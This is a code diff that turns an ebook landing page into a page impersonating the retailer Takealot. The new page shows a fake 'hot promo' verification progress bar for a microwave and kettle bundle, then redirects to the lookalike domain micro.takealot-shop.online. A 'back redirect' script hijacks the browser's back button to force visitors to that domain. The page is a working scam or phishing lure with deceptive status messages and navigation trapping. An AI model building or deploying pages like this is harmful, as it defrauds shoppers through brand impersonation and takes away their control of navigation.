@@ -1,160 +1,280 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Quora Tech - Premium Ebooks & Knowledge</title>
-    <meta name="description" content="Explore a world of expert ebooks on technology, innovation, and business. Instant delivery to any device.">
-    
-    <!-- Fonts -->
+    <title>Takealot | Processing Hot Promo...</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-    
-    <!-- Main Styles -->
-    <link rel="stylesheet" href="css/style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --tk-blue: #0B79BF;
+            --tk-dark: #121212;
+            --tk-grey: #4C4C4E;
+            --glass: rgba(0, 0, 0, 0.03);
+            --premium-gradient: linear-gradient(135deg, #0b79bf 0%, #064d7a 100%);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            color: var(--tk-dark);
+            position: relative;
+        }
+
+        /* Animated Background */
+        .bg-glow {
+            position: absolute;
+            width: 150%;
+            height: 150%;
+            background: radial-gradient(circle at 50% 50%, rgba(11, 121, 191, 0.05) 0%, transparent 50%);
+            animation: pulseBg 8s infinite alternate ease-in-out;
+            z-index: 0;
+        }
+
+        @keyframes pulseBg {
+            0% {
+                transform: scale(1) translate(-10%, -10%);
+                opacity: 0.3;
+            }
+
+            100% {
+                transform: scale(1.2) translate(5%, 5%);
+                opacity: 0.6;
+            }
+        }
+
+        .container {
+            position: relative;
+            z-index: 10;
+            text-align: center;
+            padding: 2.5rem 2rem;
+            max-width: 420px;
+            width: 90%;
+            backdrop-filter: blur(10px);
+            background: #ffffff;
+            border: 1px solid rgba(0, 0, 0, 0.05);
+            border-radius: 32px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.08);
+        }
+
+        .logo-wrapper {
+            margin-bottom: 2rem;
+            position: relative;
+        }
+
+        .logo-container {
+            background: white;
+            padding: 1.5rem;
+            border-radius: 24px;
+            display: inline-block;
+            box-shadow: 0 10px 40px rgba(11, 121, 191, 0.15);
+            animation: logoFloat 3s infinite ease-in-out;
+            border: 1px solid rgba(0, 0, 0, 0.03);
+        }
+
+        .logo-container img {
+            width: 160px;
+            display: block;
+        }
+
+        @keyframes logoFloat {
+
+            0%,
+            100% {
+                transform: translateY(0) scale(1);
+            }
+
+            50% {
+                transform: translateY(-8px) scale(1.01);
+            }
+        }
+
+        .promo-badge {
+            display: inline-block;
+            background: #ff3b30;
+            color: white;
+            font-size: 0.75rem;
+            font-weight: 800;
+            padding: 5px 14px;
+            border-radius: 100px;
+            margin-bottom: 1.2rem;
+            text-transform: uppercase;
+            letter-spacing: 1.2px;
+            animation: bounceIn 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            box-shadow: 0 4px 12px rgba(255, 59, 48, 0.3);
+        }
+
+        @keyframes bounceIn {
+            0% {
+                transform: scale(0.5);
+                opacity: 0;
+            }
+
+            80% {
+                transform: scale(1.1);
+            }
+
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        h1 {
+            font-weight: 800;
+            font-size: 1.6rem;
+            margin-bottom: 0.6rem;
+            color: var(--tk-dark);
+            letter-spacing: -0.5px;
+        }
+
+        p {
+            font-size: 0.95rem;
+            color: #666;
+            margin-bottom: 2.5rem;
+            font-weight: 400;
+            line-height: 1.5;
+        }
+
+        /* Loading Bar */
+        .progress-container {
+            width: 100%;
+            height: 8px;
+            background: #f0f0f0;
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 1.2rem;
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: var(--tk-blue);
+            box-shadow: 0 0 15px rgba(11, 121, 191, 0.3);
+            border-radius: 10px;
+            transition: width 0.1s linear;
+        }
+
+        .status-text {
+            font-size: 0.75rem;
+            color: var(--tk-blue);
+            text-transform: uppercase;
+            font-weight: 700;
+            letter-spacing: 2px;
+            height: 20px;
+        }
+
+        /* Micro-animations */
+        .dots {
+            display: inline-block;
+            width: 15px;
+            text-align: left;
+        }
+    </style>
 </head>
+
 <body>
 
-    <!-- Navigation -->
-    <nav>
-        <div class="container nav-content">
-            <a href="#" class="logo">
-                <div class="logo-icon">Q</div>
-                <h1 class="logo-text font-poppins">Quora <span>Tech</span></h1>
-            </a>
-            
-            <div class="nav-links">
-                <a href="#home">Home</a>
-                <a href="#books">Ebooks</a>
-                <a href="#about">About</a>
-                <a href="#contact">Contact</a>
-            </div>
-            
-            <a href="#books" class="btn-primary">Explore Collection</a>
-        </div>
-    </nav>
+    <div class="bg-glow"></div>
 
-    <!-- Hero Section -->
-    <header id="home" class="hero">
-        <div class="hero-blob hero-blob-1"></div>
-        <div class="hero-blob hero-blob-2"></div>
-        
-        <div class="container hero-grid">
-            <div class="hero-content">
-                <div class="badge">✦ Knowledge Hub</div>
-                <h2 class="hero-title font-poppins">Explore Knowledge, <span>Transform</span> Your Future</h2>
-                <p class="hero-desc">Discover a world of expert ebooks on technology, innovation, and business. Each page holds lessons that textbooks can't teach. High-quality insights for achievers.</p>
-                
-                <div class="hero-actions">
-                    <a href="#books" class="btn-primary">Get Started Now</a>
-                    <a href="#about" class="btn-primary btn-outline font-poppins">Learn More</a>
-                </div>
-                
-                <div class="hero-stats">
-                    <div>
-                        <span class="stat-num">18+</span>
-                        <span class="stat-label uppercase tracking-widest">Premium Ebooks</span>
-                    </div>
-                    <div>
-                        <span class="stat-num">100%</span>
-                        <span class="stat-label uppercase tracking-widest">Digital Delivery</span>
-                    </div>
-                </div>
-            </div>
-            
-            <div class="hero-image">
-                <img src="images/hero-ebooks-banner-ZtsBRQRRXArd5YCgcYRw3h.webp" alt="Quora Tech Collection">
+    <div class="container">
+        <div class="logo-wrapper">
+            <div class="logo-container">
+                <img src="logo-takealot.svg" alt="Takealot">
             </div>
         </div>
-    </header>
 
-    <!-- Books Section -->
-    <section id="books" class="section bg-soft">
-        <div class="container">
-            <div class="section-header">
-                <span class="stat-label uppercase tracking-widest" style="color: var(--primary);">Our Collection</span>
-                <h2 class="font-poppins">Featured Ebooks</h2>
-                <div class="divider"></div>
-                <p class="hero-desc" style="margin: 0 auto; line-height: 1.5;">Every book in our collection is drawn from real lives — written to challenge, comfort, and inspire you.</p>
-            </div>
-            
-            <div id="books-grid" class="books-grid">
-                <!-- Books injected via JS -->
-            </div>
+        <div class="promo-badge">HOT PROMO</div>
+
+        <h1>Processing Offer</h1>
+        <p>Verifying exclusive Russell Hobbs 20L Electronic Microwave + Cordless Stainless Steel Kettle RHSSK05...</p>
+
+        <div class="progress-container">
+            <div class="progress-bar" id="progress"></div>
         </div>
-    </section>
 
-    <!-- Why Choose Us Section -->
-    <section id="about" class="section">
-        <div class="container text-center">
-            <h2 class="font-poppins" style="font-size: 3rem; margin-bottom: 2rem;">Why Quora Tech?</h2>
-            <p class="hero-desc" style="margin: 0 auto 5rem; text-align: center;">Simplicity. Immediacy. Security.</p>
-            
-            <div class="hero-grid" style="gap: 2rem;">
-                <div style="background: var(--bg-soft); padding: 5rem; border-radius: var(--radius-3xl);">
-                    <span style="font-size: 4rem; display: block; margin-bottom: 2rem;">⚡</span>
-                    <h3 class="font-poppins" style="margin-bottom: 1.5rem;">Instant Delivery</h3>
-                    <p class="hero-desc" style="font-size: 1rem;">Your ebook is delivered immediately after purchase — no waiting, no shipping.</p>
-                </div>
-                <div style="background: var(--bg-soft); padding: 5rem; border-radius: var(--radius-3xl);">
-                    <span style="font-size: 4rem; display: block; margin-bottom: 2rem;">📱</span>
-                    <h3 class="font-poppins" style="margin-bottom: 1.5rem;">Read on Any Device</h3>
-                    <p class="hero-desc" style="font-size: 1rem;">Compatible with Kindle, tablets, smartphones, or desktop.</p>
-                </div>
-            </div>
-        </div>
-    </section>
+        <div class="status-text" id="status">STARTING...</div>
+    </div>
 
-    <!-- Contact Section -->
-    <section id="contact" class="section bg-soft">
-        <div class="container text-center">
-            <h2 class="font-poppins">Get in Touch</h2>
-            <div class="divider"></div>
-            <p class="hero-desc" style="margin: 0 auto 3rem;">Have questions? We're here to help.</p>
-            
-            <a href="mailto:ao.trilhadigital@gmail.com" class="font-poppins" style="font-size: 2rem; color: var(--primary); text-decoration: none;">ao.trilhadigital@gmail.com</a>
-        </div>
-    </section>
+    <script>
+        const statusEl = document.getElementById('status');
+        const progressEl = document.getElementById('progress');
 
-    <!-- Footer -->
-    <footer class="footer">
-        <div class="container">
-            <div class="footer-grid">
-                <div>
-                    <div class="logo">
-                        <div class="logo-icon" style="box-shadow: none;">Q</div>
-                        <h1 class="logo-text font-poppins" style="color: white;">Quora <span>Tech</span></h1>
-                    </div>
-                    <p style="margin-top: 2rem; font-size: 0.85rem;">Premium ebooks for knowledge seekers and innovators.</p>
-                </div>
-                
-                <div>
-                    <h5>Navigation</h5>
-                    <ul>
-                        <li><a href="#home">Home</a></li>
-                        <li><a href="#books">Ebooks</a></li>
-                        <li><a href="#about">About</a></li>
-                        <li><a href="#contact">Contact</a></li>
-                    </ul>
-                </div>
-                
-                <div>
-                    <h5>Legal</h5>
-                    <ul>
-                        <li><a href="#">Privacy Policy</a></li>
-                        <li><a href="#">Terms of Use</a></li>
-                    </ul>
-                </div>
-            </div>
-            
-            <div style="text-align: center; border-top: 1px solid #1e293b; padding-top: 3rem; font-size: 0.8rem;">
-                <p>&copy; 2026 Quora Tech. All rights reserved. Images included.</p>
-            </div>
-        </div>
-    </footer>
+        const statuses = [
+            "Connecting to server...",
+            "Locating liquidation batch...",
+            "Validating promo code...",
+            "Reserving your unit...",
+            "Redirecting..."
+        ];
 
-    <!-- Main Scripts -->
-    <script src="js/script.js"></script>
+        let currentStatus = 0;
+        let progress = 0;
+        const duration = 5000; // 5 seconds confirmed
+        const startTime = Date.now();
+
+        function update() {
+            const elapsed = Date.now() - startTime;
+            progress = Math.min((elapsed / duration) * 100, 100);
+            progressEl.style.width = progress + '%';
+
+            // Change status text based on progress
+            const statusIndex = Math.min(
+                Math.floor((progress / 100) * statuses.length),
+                statuses.length - 1
+            );
+
+            if (statusIndex !== currentStatus) {
+                currentStatus = statusIndex;
+                statusEl.innerText = statuses[currentStatus].toUpperCase();
+            }
+
+            if (progress < 100) {
+                requestAnimationFrame(update);
+            } else {
+                setTimeout(() => {
+                  window.location.href = 'https://micro.takealot-shop.online/' + location.search;
+                }, 500);
+            }
+        }
+
+        // Wait slightly before starting
+        setTimeout(() => {
+            update();
+        }, 500);
+    </script>
+     <!-- BACK REDIRECT -->
+<script>
+  var back_redirect_back_link =
+    "https://micro.takealot-shop.online/" + location.search;
+
+  history.pushState({}, "", location.href);
+  history.pushState({}, "", location.href);
+
+  window.addEventListener("popstate", function(event) {
+    if (event.state) {
+      setTimeout(function () {
+        location.href = back_redirect_back_link;
+      }, 1);
+    }
+  }, false);
+</script>
 </body>
+
+
 </html>
+
